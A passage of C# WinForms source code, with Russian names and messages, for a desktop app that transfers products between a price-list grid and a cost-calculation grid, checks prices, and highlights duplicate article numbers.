                MessageBox.Show("Воспользуйся кнопкой: Добавить в конец таблицы");
            }
        }





        private void button_поиск_по_баз_доб_Click(object sender, EventArgs e)
        {
            try
            {
                dataGridView_расчёт_2.Rows.Add();
                // текст перенос
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[1].Value = производительTextBox.Text;
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[2].Value = наименованиеTextBox.Text;
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[3].Value = артикулTextBox.Text;
                // режим цену
                string цена_урезанная = "0.00";
                if (ценаTextBox.TextLength > 0)
                {
                    цена_урезанная = ценаTextBox.Text.Substring(0, (ценаTextBox.TextLength - 2));
                }
                else
                {
                    MessageBox.Show("В значение нет числа! Или оно кривое! Напиши ручками, или исправь в прайсе");
                }
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[5].Value = цена_урезанная;
                //FOTO
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[4].Value = фотографияPictureBox.Image;
                //колличество + посчитать сумарно+вывести в последнюю
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[6].Value = numericUpDown3.Value;
                decimal newDecimal;
                bool isDecimal = Decimal.TryParse(ценаTextBox.Text.ToString(), out newDecimal);
                string twoDecimalPlaces = (newDecimal * numericUpDown3.Value).ToString("########.00");
                if (newDecimal < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[7].Value = twoDecimalPlaces;
                label_consol.Text = "Строка: " + (tableDataGridView.CurrentRow.Index + 1).ToString() + " прайса добавлена в конец расчёта!";
                label_consol_2.Text = "Добавлено с прайса в конец списка!" + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
                dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0];// переместим курсор в конец

                label_добавленно.Text = "Добавлено в конце!";
                label_добавленно.Visible = true;
                razhet_label.Visible = true;
                timer_labe_добавленна.Enabled = true;
            }
            catch
            {
                label_consol_2.Text = "Где-то в ячейках прайса ошибки в числах! Проверь цифры!! Перезагрузи прайс";
                label_consol.Text = "Где-то в ячейках прайса ошибки в числах! Проверь цифры!! Перезагрузи прайс";

            }
        }

        private void button_поиск_по_баз_под_Click(object sender, EventArgs e)
        {


            try
            {

                dataGridView_расчёт_2.Rows.Insert(dataGridView_расчёт_2.CurrentCell.RowIndex + 1, 1); //дабавить под выделенной строкой

                // dataGridView_Заказ.Rows.Add();

                // текст перенос
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[1].Value = производительTextBox.Text;
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[2].Value = наименованиеTextBox.Text;
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[3].Value = артикулTextBox.Text;


                // режим цену
                string цена_урезанная = "0.00";
                if (ценаTextBox.TextLength > 0)
                {
                    цена_урезанная = ценаTextBox.Text.Substring(0, (ценаTextBox.TextLength - 2));
                }
                else
                {
                    MessageBox.Show("В значение нет числа! Или оно кривое! Впиши в ручную! Или исправь в базе");
                }


                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[5].Value = цена_урезанная;
                //FOTO
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[4].Value = фотографияPictureBox.Image;
                //колличество + посчитать сумарно+вывести в последнюю
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[6].Value = numericUpDown3.Value;
                decimal newDecimal;
                bool isDecimal = Decimal.TryParse(ценаTextBox.Text.ToString(), out newDecimal);
                string twoDecimalPlaces = (newDecimal * numericUpDown3.Value).ToString("########.00");
                if (newDecimal < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[7].Value = twoDecimalPlaces;


                label_consol_2.Text = "Добавлено с базы. Под выбранной стракой!" + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
                label_consol.Text = "Строка: " + (tableDataGridView.CurrentRow.Index + 1).ToString() + " прайса добавлена под:" + (dataGridView_расчёт_2.CurrentRow.Index + 1).ToString() + " в расчёте.";

                dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[0];// переместим курсор в под неё 
                label_добавленно.Text = "Добавлено под стракой!";
                label_добавленно.Visible = true;
                razhet_label.Visible = true;
                timer_labe_добавленна.Enabled = true;
            }
            catch
            {

                label_consol_2.Text = "Хрен Вам!. Нужна чтоб хоть она созданная строка в расчёте! Или у тя где-то в ячейках прайса ошибки! Проверь цифры!! Перезагрузи прайс";
                label_consol.Text = "Хрен Вам!. Нужна чтоб хоть она созданная строка в расчёте! Или у тя где-то в ячейках прайса ошибки! Проверь цифры!! Перезагрузи прайс";
            }


        }

        private void button_поиск_по_баз_замен_Click(object sender, EventArgs e)
        {


            try
            {




                // текст перенос
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[0].Value = "";
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[1].Value = производительTextBox.Text;
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[2].Value = наименованиеTextBox.Text;
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[3].Value = артикулTextBox.Text;

                for (int i = 0; i < 8; i++)
                {
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[i].Style.BackColor = Color.Empty; ;
                }
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[10].Style.BackColor = Color.Empty;

                // режим цену
                string цена_урезанная = "0.00";
                if (ценаTextBox.TextLength > 0)
                {
                    цена_урезанная = ценаTextBox.Text.Substring(0, (ценаTextBox.TextLength - 2));
                }
                else
                {
                    MessageBox.Show("В значение нет числа! Или оно кривое! Впиши в ручную! Или исправь в базе");
                }


                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[5].Value = цена_урезанная;
                //FOTO
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = фотографияPictureBox.Image;



                //колличество + посчитать сумарно+вывести в последнюю
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[6].Value = numericUpDown3.Value;
                decimal newDecimal;
                bool isDecimal = Decimal.TryParse(ценаTextBox.Text.ToString(), out newDecimal);
                string twoDecimalPlaces = (newDecimal * numericUpDown3.Value).ToString("########.00");
                if (newDecimal < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[7].Value = twoDecimalPlaces;


                if (checkBox2.Checked == true) { dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[0]; }
                label_consol_2.Text = "Добавлено с прайса. Вместо того что было сейчас в строке!" + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
                label_consol.Text = "Строка: " + (tableDataGridView.CurrentRow.Index + 1).ToString() + " прайса заменила строку:" + (dataGridView_расчёт_2.CurrentRow.Index + 1).ToString() + " в расчёте.";
                label_добавленно.Text = "Заменила!";
                label_добавленно.Visible = true;
                razhet_label.Visible = true;
                timer_labe_добавленна.Enabled = true;
            }
            catch
            {

                label_consol_2.Text = "Хрен Вам!. Нужна хоть она созданная строка! или у тя где-то в ячейках базы ошибки в числах! Проверь цифры!! Перезагрузи прайс";
            }

        }

        //поиск с одинаковым артикулом



        public string[] povtor = null;
        public string[] povtor_strit1 = null;
        public string[] povtor_strit2 = null;
        public bool open_window_otchetik = false;
        private void button2_Click(object sender, EventArgs e)
        {

            dialog_mess("Start");

            povtor = null;
            povtor_strit1 = null;
            povtor_strit2 = null;
            // tableDataGridView[0, 0].Style.BackColor = Color.FromArgb(255, 255, 69, 00); // подкрасить ячейку "заметка"
            label_consol.Text = "ищу, подожи..";
            for (int x = 0; x < tableDataGridView.Rows.Count - 1; x++)
            {
                dialog_mess("Очистка:" + ((x * 100) / tableDataGridView.Rows.Count).ToString());
                tableDataGridView[3, x].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
            }

            Random randomizer = new Random();

            int poftor = 0;
            for (int x = 0; x < tableDataGridView.Rows.Count - 1; x++)
            {
                dialog_mess("Проверка:" + ((x * 100) / tableDataGridView.Rows.Count).ToString());
                var t = tableDataGridView.Rows[x].Cells[3].Value.ToString();

                int rondom1 = randomizer.Next(20, 255);
                int rondom2 = randomizer.Next(20, 255);


                for (int y = x + 1; y < tableDataGridView.Rows.Count - 1; y++)
                {
                    var r = tableDataGridView.Rows[y].Cells[3].Value.ToString();
                    if (t == r)
                    {
                        //задаем цвета в текущей
                        if (tableDataGridView[3, x].Style.BackColor != Color.FromArgb(255, 255, 255, 255))
                        {
                            tableDataGridView[3, y].Style.BackColor = tableDataGridView[3, x].Style.BackColor;
                        }
                        else
                        {
                            tableDataGridView[3, x].Style.BackColor = Color.FromArgb(255, 255, rondom1, rondom2);
                            tableDataGridView[3, y].Style.BackColor = Color.FromArgb(255, 255, rondom1, rondom2);
                        }
                        poftor++;
                        //увеличиваем массив для переноса в новую форму
                        if (povtor != null)
                        {
                            string[] vremianka = new string[povtor.Length];
                            string[] vremianka1 = new string[povtor.Length];
                            string[] vremianka2 = new string[povtor.Length];
                            vremianka = povtor;
                            vremianka1 = povtor_strit1;
                            vremianka2 = povtor_strit2;
                            povtor = new string[poftor];
                            povtor_strit1 = new string[poftor];
                            povtor_strit2 = new string[poftor];
                            for (int i = 0; i < vremianka.Length; i++)
                            {
                                povtor[i] = vremianka[i];
                                povtor_strit1[i] = vremianka1[i];
                                povtor_strit2[i] = vremianka2[i];
                            }
                            povtor[poftor - 1] = r;
                            povtor_strit1[poftor - 1] = (x + 1).ToString();
                            povtor_strit2[poftor - 1] = (y + 1).ToString();
                        }
                        else
                        {
                            povtor = new string[poftor];
                            povtor[poftor - 1] = r;
                            povtor_strit1 = new string[poftor];
                            povtor_strit2 = new string[poftor];
                            povtor_strit1[poftor - 1] = (x + 1).ToString();
                            povtor_strit2[poftor - 1] = (y + 1).ToString();
                        }
                        y = tableDataGridView.Rows.Count;
                    }
                }
            }

            if (poftor > 0)
            {
                if (open_window_otchetik == false) //
                { //
                    Form fdd = new отчет_с_поиска_по_повторам();
                    fdd.TopMost = true;
                    fdd.Show();
                    open_window_otchetik = true;
                }//
                label_consol.Text = "В таблице повторяющихся артикулов:" + (poftor).ToString() + " шт. Я подсветил пары разными цветами.Но если больше 2-х друг другу одинаковы, цвета не сойдутся :)";
            }
            else { label_consol.Text = "Нет повторов. Все хорошо."; MessageBox.Show("Всё хорошо. Повторов нет.", "Пойдет! Не парься.", MessageBoxButtons.OK, MessageBoxIcon.Information); }

            dialog_mess("Stop");


        }


        //пробуем ходить по таблице


        public void perehod_if_prais(string stroka)
        {
            if (stroka == "☺☻")
            {
                button_поиск_копий_в_базе.PerformClick();
            }
            else
            {
                int wtf = Convert.ToInt16(stroka);
                if (button_Baza_RACHET.Text == "ПРАЙС > РАСЧЁТ")
                {
                    tableDataGridView.CurrentCell = tableDataGridView.Rows[wtf - 1].Cells[2];
                }
            }
        }
        //удаляем из под таблицы
        public void del_if_prais(string stroka)
        {
            int ad = Convert.ToInt16(stroka);
            ad--;
            tableDataGridView.Rows.RemoveAt(ad);
            label_consol.Text = "Выбранная строка была удалена из прайса..";
            return;

        }

        private void ценаTextBox_Leave(object sender, EventArgs e)
        {// в поиске цена балуемся с , и . что б нормально вводились числа
            ценаTextBox.Text = ценаTextBox.Text.Replace(".", ",");

            decimal newDecimal;
            bool isDecimal = Decimal.TryParse(ценаTextBox.Text.ToString(), out newDecimal);
            ценаTextBox.Text = newDecimal.ToString("########.0000");

        }



        Decimal koff_klienty = 1;
        private void button_взять_актуальные_цены_с_базы_Click(object sender, EventArgs e)
        {
            button_поиск.PerformClick();

            otclehivat_polzovatelia = false;


            if (tableDataGridView.NewRowIndex > 1)
            {
                // MessageBox.Show("Пишу.. Еще в разаработке!\nЖдите... Могу анегдот загрузить", "Ошибка чтения изображения");

                for (int q = 0; q <= dataGridView_расчёт_2.NewRowIndex; q++) //чистим цвета все
                {
                    for (int w = 1; w < 5; w++) // dataGridView_расчёт_2
                    {
                        if (dataGridView_расчёт_2[w, q].Style.BackColor == Color.Red || dataGridView_расчёт_2[w, q].Style.BackColor == Color.Gray)
                        {

                            dataGridView_расчёт_2[w, q].Style.BackColor = Color.Empty;
                        }
                    }
                }


                for (int r = 0; r < dataGridView_расчёт_2.NewRowIndex; r++) //запускам поисковый  круг в нашей таблице
                {
                    bool sobutia_esly_nahla = false; //фиксируем отсутсвие найденного обьекта

                    for (int b = 0; b < tableDataGridView.NewRowIndex; b++) //запускам поисковый цикл в таблицы базы
                    {
                        if (dataGridView_расчёт_2.Rows[r].Cells[3].Value != null) //если ничего нет в артикуле расчетке
                        {
                            string a = dataGridView_расчёт_2.Rows[r].Cells[3].Value.ToString();
                            if (tableDataGridView.Rows[b].Cells[3].Value != null) //если ничего нет в артикуле базы
                            {
                                string s = tableDataGridView.Rows[b].Cells[3].Value.ToString();
                                if (a == s) // сошлать  строчка в нашей расчетке по артикулу со строчкой в безе 

                                {
                                    sobutia_esly_nahla = true; //фиксируем сходство

                                    //переносим значение


                                    string q1 = null;
                                    string q2 = null;
                                    try { q1 = dataGridView_расчёт_2.Rows[r].Cells[1].Value.ToString(); } catch { q1 = ""; }
                                    try { q2 = dataGridView_расчёт_2.Rows[r].Cells[2].Value.ToString(); } catch { q2 = ""; }
                                    if (q1 != tableDataGridView.Rows[b].Cells[1].Value.ToString() || q2 != tableDataGridView.Rows[b].Cells[2].Value.ToString())//Если не соответствует произодитель if (dataGridView_Заказ.Rows[r].Cells[1].Value.ToString() != tableDataGridView.Rows[b].Cells[1].Value.ToString() || dataGridView_Заказ.Rows[r].Cells[2].Value.ToString() != tableDataGridView.Rows[b].Cells[2].Value.ToString())
                                    {

                                        comboBox_наименование_поиск_по_базе.SelectedIndex = comboBox_цена_поиск_по_базе.SelectedIndex;



                                        if (q1 != tableDataGridView.Rows[b].Cells[1].Value.ToString())
                                        {
                                            dataGridView_расчёт_2[1, r].Style.BackColor = Color.Gray;//подкрасим
                                            tableDataGridView.CurrentCell = tableDataGridView.Rows[b].Cells[1]; //покажим в одной таблице
                                            dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[r].Cells[1]; //во второй

                                        }
                                        if (q2 != tableDataGridView.Rows[b].Cells[2].Value.ToString())
                                        {
                                            dataGridView_расчёт_2[2, r].Style.BackColor = Color.Gray;
                                            tableDataGridView.CurrentCell = tableDataGridView.Rows[b].Cells[2]; //покажим в одной таблице
                                            dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[r].Cells[2]; //во второй

                                        }

                                        DialogResult result = MessageBox.Show(
                                          "В расчетке\nПроизводитель: " + q1 + "\n" +
                                          "Наименование: " + q2 + "\n" +
                                          "\n\nВ базе\nПроизводитель: " + tableDataGridView.Rows[b].Cells[1].Value.ToString() + "\n" +
                                          "Наименование: " + tableDataGridView.Rows[b].Cells[2].Value.ToString() + "\n" +
                                          "\n\n Заменить в расчетке эти данные или оставить как есть?\nВ любом случае я подсвечу" +
                                          " серым цветом эти значения! "

                                          ,
                                          "Производитель в расчетке отличается от Производитель в базе",
                                         MessageBoxButtons.YesNo,
                                         MessageBoxIcon.Information,
                                         MessageBoxDefaultButton.Button1);

                                        if (result == DialogResult.Yes)
                                        {
                                            dataGridView_расчёт_2.Rows[r].Cells[1].Value = tableDataGridView.Rows[b].Cells[1].Value;
                                            dataGridView_расчёт_2.Rows[r].Cells[2].Value = tableDataGridView.Rows[b].Cells[2].Value;

                                            //dataGridView_расчёт_2.Rows[r].Cells[4].Value = tableDataGridView.Rows[b].Cells[4].Value;
                                            try
                                            {

                                                tableDataGridView.CurrentCell = tableDataGridView.Rows[b].Cells[0];

                                                if (фотографияPictureBox.Image == null)
                                                {
                                                    dataGridView_расчёт_2.Rows[r].Cells[4].Value = null;
                                                    pictureBox_Raz.Image = pictureBox_Raz1.Image;
                                                    groupBox_картинка_расчетки.Enabled = false;
                                                }
                                                else
                                                {
                                                    Bitmap img = new Bitmap(фотографияPictureBox.Image);
                                                    pictureBox_Raz.Image = img;
                                                    groupBox_картинка_расчетки.Enabled = true;
                                                    dataGridView_расчёт_2.Rows[r].Cells[4].Value = img;
                                                }

                                            }
                                            catch { pictureBox_Raz.Image = pictureBox_Raz1.Image; groupBox_картинка_расчетки.Enabled = false; }

                                            decimal newDecimal;

                                            try
                                            {
                                                bool isDecimal = Decimal.TryParse(tableDataGridView.Rows[b].Cells[5].Value.ToString(), out newDecimal);
                                                newDecimal = newDecimal * koff_klienty;
                                                string twoDecimalPlaces = (newDecimal).ToString("########.00");
                                                if (newDecimal < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                                                dataGridView_расчёт_2.Rows[r].Cells[5].Value = twoDecimalPlaces;
                                            }
                                            catch { }
                                            //  dataGridView_Заказ.Rows[r].Cells[5].Value = tableDataGridView.Rows[b].Cells[5].Value;

                                        }

                                    }
                                    else //добавил сейчас
                                    {//добавил сейчас
                                     //  dataGridView_расчёт_2.Rows[r].Cells[4].Value = tableDataGridView.Rows[b].Cells[4].Value;//добавил сейчас

                                        decimal newDecimal;
                                        bool isDecimal = Decimal.TryParse(tableDataGridView.Rows[b].Cells[5].Value.ToString(), out newDecimal);
                                        if (isDecimal == false)
                                        {
                                            MessageBox.Show("Цена в прайсе,какае-то кривая" +
                                           "\n Артикул:" + tableDataGridView.Rows[b].Cells[3].Value.ToString()
                                           + "\n Строка номер:" + tableDataGridView.Rows[b].Cells[0].Value.ToString()
                                                ,
                                                "Вот это поворот!",
                                             MessageBoxButtons.OK,
                                             MessageBoxIcon.Warning);
                                        }
                                        else
                                        {
                                            newDecimal = newDecimal * koff_klienty;
                                            string twoDecimalPlaces = (newDecimal).ToString("########.00");
                                            if (newDecimal < 1) { twoDecimalPlaces = "0" + twoDecimalPlaces; }
                                            dataGridView_расчёт_2.Rows[r].Cells[5].Value = twoDecimalPlaces;

                                            //перенесем фото
                                            try
                                            {

                                                tableDataGridView.CurrentCell = tableDataGridView.Rows[b].Cells[0];

                                                if (фотографияPictureBox.Image == null)
                                                {
                                                    dataGridView_расчёт_2.Rows[r].Cells[4].Value = null;
                                                    pictureBox_Raz.Image = pictureBox_Raz1.Image;
                                                    groupBox_картинка_расчетки.Enabled = false;
                                                }
                                                else
                                                {
                                                    Bitmap img = new Bitmap(фотографияPictureBox.Image);
                                                    pictureBox_Raz.Image = img;
                                                    groupBox_картинка_расчетки.Enabled = true;
                                                    dataGridView_расчёт_2.Rows[r].Cells[4].Value = img;
                                                }

                                            }
                                            catch { pictureBox_Raz.Image = pictureBox_Raz1.Image; groupBox_картинка_расчетки.Enabled = false; }

                                        }
                                    }//добавил сейчас

                                    //закончим поиск
                                    b = tableDataGridView.NewRowIndex;
                                }
                            }
                            else { sobutia_esly_nahla = true; }
                        }
                        else { sobutia_esly_nahla = true; }
                    }



                    if (sobutia_esly_nahla == false)//если не сошлась то красим в нашей таблице
                    {
                        for (int w = 1; w < 5; w++) // 
                        {
                            dataGridView_расчёт_2[w, r].Style.BackColor = Color.Red;
                        }

                        string номер = "";
                        string производитель = "";
                        string наименование = "";
                        string артикул = "";
                        try { номер = dataGridView_расчёт_2.Rows[r].Cells[0].Value.ToString(); } catch { }
                        try { производитель = dataGridView_расчёт_2.Rows[r].Cells[1].Value.ToString(); } catch { }
                        try { наименование = dataGridView_расчёт_2.Rows[r].Cells[2].Value.ToString(); } catch { }
                        try { артикул = dataGridView_расчёт_2.Rows[r].Cells[3].Value.ToString(); } catch { }



                        MessageBox.Show("Одного артикула нету в прайсе!!! \n" +
                            "Я подсветила его красным цветом! \n" +
                            "А именно: \n" +
                            "Физически строка: " + (r + 1).ToString() +
                            "\nНомер по расчету: " + номер +
                            "\nПроизводитель: " + производитель +
                            "\nНаименование " + наименование +
                            "\nАртикул: " + артикул

                            ,
                            "Вот это поворот!",
                             MessageBoxButtons.OK,
                             MessageBoxIcon.Warning);

                    }

                }
            }
            else MessageBox.Show("Прайс пустой! Нечего считать!", "Серьезная ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            otclehivat_polzovatelia = true;

        }


        private void button_new_istohnic_baza_Click(object sender, EventArgs e)
        {

        }

        private void button_perenos_obratno_Click(object sender, EventArgs e)
        {
            dialog_mess("Start");

            //обходчик окон
            bool dod = false;
            if (Baza == true) { dod = true; Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }
            button_поиск.PerformClick();






            if (dataGridView_расчёт_2.NewRowIndex == 0)
            {
                label_consol_2.Text = "Нечего переносить! Ты наверно вчера не закусывал!";

            }
            else
            {


                // закрасим все белым, типо нет ошибок
                for (int q = 0; q <= dataGridView_расчёт_2.NewRowIndex; q++)
                {
                    dialog_mess("Подготовка:\n" + (q + 1).ToString() + "/" + (dataGridView_расчёт_2.NewRowIndex + 1).ToString());
                    for (int w = 1; w < 8; w++)
                    {
                        dataGridView_расчёт_2[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                    }
                }
                int uu = 0;
                List<int> ErrorList = new List<int>();
                for (int q = 0; q < dataGridView_расчёт_2.NewRowIndex; q++) // проеряем нет ли пустых строк в числах!
                {
                    dialog_mess("Проверка1:\n" + (q + 1).ToString() + "/" + (dataGridView_расчёт_2.NewRowIndex + 1).ToString());
                    bool ohibki_tik = false; //проверка на цикл, вспомогательная переменная

                    int trt = 0;
                    if (dataGridView_расчёт_2.Rows[q].Cells[1].Value == null) { dataGridView_расчёт_2[0, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); dataGridView_расчёт_2[1, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki_tik = true; } else { trt++; }
                    if (dataGridView_расчёт_2.Rows[q].Cells[2].Value == null) { dataGridView_расчёт_2[0, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); dataGridView_расчёт_2[2, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki_tik = true; } else { trt++; }
                    if (dataGridView_расчёт_2.Rows[q].Cells[3].Value == null) { dataGridView_расчёт_2[0, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); dataGridView_расчёт_2[3, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki_tik = true; } else { trt++; }
                    if (dataGridView_расчёт_2.Rows[q].Cells[5].Value == null) { dataGridView_расчёт_2[0, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); dataGridView_расчёт_2[5, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki_tik = true; } else { trt++; }

                    if (trt == 1)
                    {
                        for (int i = 0; i < 8; i++)
                        {
                            dataGridView_расчёт_2.Rows[q].Cells[i].Style.BackColor = Color.PowderBlue;
                        }
                        dataGridView_расчёт_2.Rows[q].Cells[10].Style.BackColor = Color.PowderBlue;
                    }


                    if (ohibki_tik == true) ErrorList.Add(q); //фиксируем проблемную строку. 
                    ohibki_tik = false;

                    //  dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                }

                for (int q = 0; q < dataGridView_расчёт_2.NewRowIndex; q++) // проеряем число цены!
                {
                    dialog_mess("Проверка2:\n " + (q + 1).ToString() + "/" + (dataGridView_расчёт_2.NewRowIndex + 1).ToString());
                    if (dataGridView_расчёт_2.Rows[q].Cells[5].Value != null)
                    {
                        string цена = dataGridView_расчёт_2.Rows[q].Cells[5].Value.ToString();
                        цена = цена.Replace(".", ",");

                        decimal newDecimal;
                        bool isDecimal = Decimal.TryParse(цена, out newDecimal);
                        dataGridView_расчёт_2.Rows[q].Cells[5].Value = newDecimal.ToString("########.0000");


                        string цена_получилось = dataGridView_расчёт_2.Rows[q].Cells[5].Value.ToString();
                        if (цена_получилось == ",0000")
                        {
                            dataGridView_расчёт_2[1, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                            dataGridView_расчёт_2[2, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                            dataGridView_расчёт_2[3, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                            dataGridView_расчёт_2[4, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                            dataGridView_расчёт_2[5, q].Style.BackColor = Color.FromArgb(255, 255, 20, 20);
                            ErrorList.Add(q);
                            uu++;
                        }
                    }
                    //  dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                }
                // перегонем в др формат строки для пропуска.
                int[] эти_строки_надо_пропустить = new int[ErrorList.Count];
                int l = 0;
                foreach (int y in ErrorList)
                {
                    эти_строки_надо_пропустить[l] = y;
                    l++;
                }
                for (int q = 0; q < dataGridView_расчёт_2.NewRowIndex; q++) // проеряем число цены!
                {
                    dialog_mess("Перенос:\n" + (q + 1).ToString() + "/" + (dataGridView_расчёт_2.NewRowIndex + 1).ToString());
                    if (эти_строки_надо_пропустить.Contains(q)) { }
                    else
                    {
                        bindingNavigatorAddNewItem.Visible = true;
                        bindingNavigatorAddNewItem.PerformClick(); // добавить строку в таблице базы
                        bindingNavigatorAddNewItem.Visible = false;
                        производительTextBox.Text = dataGridView_расчёт_2.Rows[q].Cells[1].Value.ToString();
                        наименованиеTextBox.Text = dataGridView_расчёт_2.Rows[q].Cells[2].Value.ToString();
                        артикулTextBox.Text = dataGridView_расчёт_2.Rows[q].Cells[3].Value.ToString();
                        ценаTextBox.Text = dataGridView_расчёт_2.Rows[q].Cells[5].Value.ToString();
                        if (dataGridView_расчёт_2.Rows[q].Cells[4].Value != null) фотографияPictureBox.Image = dataGridView_расчёт_2.Rows[q].Cells[4].Value as Bitmap;
                        //возращаем назад расчетку с "00" вместо "0000"
                        string цена_получилось2 = dataGridView_расчёт_2.Rows[q].Cells[5].Value.ToString();
                        цена_получилось2 = цена_получилось2.Remove(цена_получилось2.Length - 2);
                        dataGridView_расчёт_2.Rows[q].Cells[5].Value = цена_получилось2;
                    }
                }
                tableDataGridView.CurrentCell = tableDataGridView.Rows[tableDataGridView.RowCount - 1].Cells[2];
                label_consol.Text = "Добавлено всё из расчётки в конецв прайса.";
                tableDataGridView.CurrentCell = tableDataGridView.Rows[tableDataGridView.RowCount - 2].Cells[2];
                label_consol_2.Text = "Перенесено в конец базы. Не забывай проверить нет ли копий выше в базе.";
                if (uu > 0) { MessageBox.Show("В расчетке есть ошибки. Перенесены не все строки.\nЯ подсветила красным те строки, которые не перенесла!", "Ошибка в строках расчета.", MessageBoxButtons.OK, MessageBoxIcon.Error); }
            }
            if (dod == true) { Baza = true; button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС"; groupBox_baza.Visible = false; groupBox_razhet.Visible = true; }
            dialog_mess("Stop");
        }
        private void button_ctroky_v_bazy_Click(object sender, EventArgs e)
        {    //обходчик окон
            bool dod = false;
            if (Baza == true) { dod = true; Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }
            button_поиск.PerformClick();
            bool ohibki = false;
            bool ohibki1 = false;
            // закрасим все белым, типо нет ошибок
            try
            {
                for (int w = 1; w < 8; w++)
                {
                    dataGridView_расчёт_2[w, dataGridView_расчёт_2.CurrentRow.Index].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                }
            }
            catch
            { ohibki1 = true; }
            //говорим что нет ошибок
            if (ohibki1 == true)
            { label_consol_2.Text = "Нечего переносить! Строк нет!"; }
            else
            {
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[1].Value == null) { dataGridView_расчёт_2[1, dataGridView_расчёт_2.CurrentRow.Index].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki = true; }
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[2].Value == null) { dataGridView_расчёт_2[2, dataGridView_расчёт_2.CurrentRow.Index].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki = true; }
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[3].Value == null) { dataGridView_расчёт_2[3, dataGridView_расчёт_2.CurrentRow.Index].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki = true; }
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value == null) { dataGridView_расчёт_2[5, dataGridView_расчёт_2.CurrentRow.Index].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki = true; }
                //  dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                // проеряем число цены!
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value != null)
                {
